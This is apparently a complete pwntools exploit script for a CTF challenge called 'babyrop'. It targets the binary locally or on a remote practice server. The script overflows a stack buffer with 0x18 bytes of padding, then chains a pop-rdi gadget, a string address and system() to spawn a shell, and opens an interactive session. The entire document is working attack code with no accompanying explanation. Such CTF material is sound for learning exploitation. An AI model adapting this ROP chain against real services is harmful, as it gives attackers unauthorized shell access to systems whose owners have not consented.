import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./babyrop')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./babyrop')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',28400)
			elf=ELF('babyrop')
			#libc=ELF('')

		io.recv()
		pay='a'*0x18+p64(0x0000000000400683)+p64(0x0000000000601048)+p64(elf.sym['system'])
		io.sendline(pay)

		#gdb.attach(io)
		#pause()
		io.interactive()
	except Exception as e:
		raise e
	else:
		pass